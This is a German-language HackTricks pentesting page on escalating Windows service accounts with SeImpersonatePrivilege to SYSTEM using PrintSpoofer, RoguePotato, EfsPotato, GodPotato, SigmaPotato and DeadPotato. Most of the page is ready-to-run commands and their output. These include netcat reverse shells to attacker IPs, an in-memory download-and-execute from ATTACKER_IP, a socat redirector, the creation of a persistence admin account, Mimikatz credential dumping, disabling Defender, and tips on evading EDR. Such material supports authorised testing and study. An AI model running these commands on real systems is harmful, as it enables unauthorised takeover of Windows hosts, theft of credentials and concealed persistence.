# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato funktioniert nicht mehr** auf Windows Server 2019 und Windows 10 Build 1809 und neuer. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) geht ausführlich auf das `PrintSpoofer`-Tool ein, das verwendet werden kann, um Impersonation-Privilegien auf Windows 10- und Server 2019-Hosts auszunutzen, auf denen JuicyPotato nicht mehr funktioniert.

> [!TIP]
> Eine moderne Alternative, die 2024–2025 häufig gepflegt wird, ist SigmaPotato (ein Fork von GodPotato), die in-memory/.NET reflection Nutzung und erweiterten OS-Support hinzufügt. Siehe die kurze Verwendung weiter unten und das Repo in References.

Verwandte Seiten für Hintergrundinformationen und manuelle Techniken:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Anforderungen und häufige Fallstricke

Alle folgenden Techniken basieren darauf, einen zu Impersonation fähigen privilegierten Dienst auszunutzen, von einem Kontext aus, der eine der folgenden Privilegien besitzt:

- SeImpersonatePrivilege (am häufigsten) oder SeAssignPrimaryTokenPrivilege
- Hohe Integrität ist nicht erforderlich, wenn das Token bereits SeImpersonatePrivilege besitzt (typisch für viele Servicekonten wie IIS AppPool, MSSQL, usw.)

Privilegien schnell prüfen:
```cmd
whoami /priv | findstr /i impersonate
```
Betriebliche Hinweise:

- Wenn Ihre Shell unter einem eingeschränkten Token läuft, dem SeImpersonatePrivilege fehlt (häufig bei Local Service/Network Service in einigen Kontexten), stellen Sie die Standardrechte des Accounts mit FullPowers wieder her und führen Sie dann einen Potato aus. Beispiel: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer benötigt, dass der Print Spooler Dienst läuft und über den lokalen RPC-Endpunkt (spoolss) erreichbar ist. In gehärteten Umgebungen, in denen Spooler nach PrintNightmare deaktiviert wurde, bevorzugen Sie RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato benötigt einen OXID-Resolver, der über TCP/135 erreichbar ist. Wenn egress blockiert ist, verwenden Sie einen redirector/port-forwarder (siehe Beispiel unten). Ältere Builds benötigten das -f-Flag.
- EfsPotato/SharpEfsPotato missbrauchen MS-EFSR; wenn eine Pipe blockiert ist, versuchen Sie alternative Pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Fehler 0x6d3 während RpcBindingSetAuthInfo deutet typischerweise auf einen unbekannten/nicht unterstützten RPC-Authentifizierungsdienst hin; versuchen Sie eine andere Pipe/Transport oder stellen Sie sicher, dass der Zieldienst läuft.
- "Kitchen-sink"-Forks wie DeadPotato bündeln zusätzliche Payload-Module (Mimikatz/SharpHound/Defender off), die die Festplatte berühren; erwarten Sie im Vergleich zu den schlanken Originalen eine höhere EDR-Erkennung.

## Kurze Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Hinweise:
- Du kannst -i verwenden, um einen interaktiven Prozess in der aktuellen Konsole zu starten, oder -c, um einen Einzeiler auszuführen.
- Benötigt den Spooler-Dienst. Wenn dieser deaktiviert ist, schlägt das fehl.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Wenn ausgehender Port 135 blockiert ist, pivot the OXID resolver via socat on your redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato ist eine neuere COM-Abuse-Primitive, die Ende 2022 veröffentlicht wurde und den **PrintNotify**-Dienst anstelle des Spooler/BITS angreift. Die Binärdatei instanziiert den PrintNotify COM-Server, tauscht ein gefälschtes `IUnknown` ein und löst dann über `CreatePointerMoniker` einen privilegierten Callback aus. Wenn der PrintNotify-Dienst (ausgeführt als **SYSTEM**) zurückverbindet, dupliziert der Prozess das zurückgegebene Token und startet das gelieferte payload mit vollen Rechten.

Wichtige Betriebsnotizen:

* Funktioniert unter Windows 10/11 und Windows Server 2012–2022, solange der Print Workflow/PrintNotify-Dienst installiert ist (er ist selbst dann vorhanden, wenn der legacy Spooler nach PrintNightmare deaktiviert wurde).
* Erfordert, dass der aufrufende Kontext **SeImpersonatePrivilege** besitzt (typisch für IIS APPPOOL, MSSQL und Dienstkonten für scheduled-tasks).
* Akzeptiert entweder einen direkten Befehl oder einen interaktiven Modus, sodass Sie in der ursprünglichen Konsole verbleiben können. Beispiel:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Da es rein COM-basiert ist, sind weder named-pipe listeners noch external redirectors erforderlich, wodurch es ein direkter Ersatz auf Hosts ist, auf denen Defender RoguePotato’s RPC binding blockiert.

Operatoren wie Ink Dragon setzen PrintNotifyPotato unmittelbar nach dem Erhalt von ViewState RCE auf SharePoint ein, um vom `w3wp.exe`-Worker zu SYSTEM zu pivot, bevor sie ShadowPad installieren.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Tipp: Wenn eine pipe fehlschlägt oder EDR sie blockiert, versuche die anderen unterstützten pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Hinweise:
- Funktioniert unter Windows 8/8.1–11 und Server 2012–2022, wenn SeImpersonatePrivilege vorhanden ist.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato bietet zwei Varianten, die auf Service-DCOM-Objekte abzielen, die standardmäßig auf RPC_C_IMP_LEVEL_IMPERSONATE stehen. Kompiliere oder verwende die bereitgestellten binaries und führe deinen Befehl aus:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (aktualisierter GodPotato-Fork)

SigmaPotato fügt moderne Annehmlichkeiten wie in-memory execution via .NET reflection und einen PowerShell reverse shell Helfer hinzu.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Zusätzliche Features in den Builds 2024–2025 (v1.2.x):
- Integrierter reverse-shell-Flag `--revshell` und Entfernung des 1024-Zeichen-Limits von PowerShell, sodass lange Payloads, die AMSI umgehen, in einem Rutsch ausgeführt werden können.
- Reflection-freundliche Syntax (`[SigmaPotato]::Main()`), sowie ein rudimentärer AV-Evasions-Trick mittels `VirtualAllocExNuma()`, um einfache Heuristiken zu täuschen.
- Getrennte `SigmaPotatoCore.exe`, gegen .NET 2.0 kompiliert für PowerShell Core-Umgebungen.

### DeadPotato (2024 GodPotato-Überarbeitung mit Modulen)

DeadPotato behält die GodPotato OXID/DCOM-Impersonation-Kette bei, integriert jedoch post-exploitation-Helfer, sodass Operatoren sofort SYSTEM übernehmen und persistence/collection durchführen können, ohne zusätzliche Tools.

Gängige Module (alle benötigen SeImpersonatePrivilege):

- `-cmd "<cmd>"` — einen beliebigen Befehl als SYSTEM ausführen.
- `-rev <ip:port>` — schnelle reverse shell.
- `-newadmin user:pass` — einen lokalen Administrator für persistence anlegen.
- `-mimi sam|lsa|all` — Mimikatz ablegen und ausführen, um credentials zu dumpen (schreibt auf die Festplatte, auffällig).
- `-sharphound` — SharpHound collection als SYSTEM ausführen.
- `-defender off` — Defender-Echtzeitschutz ausschalten (sehr auffällig).

Beispiel-One-Liner:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Da es zusätzliche Binärdateien mitliefert, ist mit höheren AV/EDR-Flags zu rechnen; verwende die schlankere GodPotato/SigmaPotato, wenn Stealth wichtig ist.

## Referenzen

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
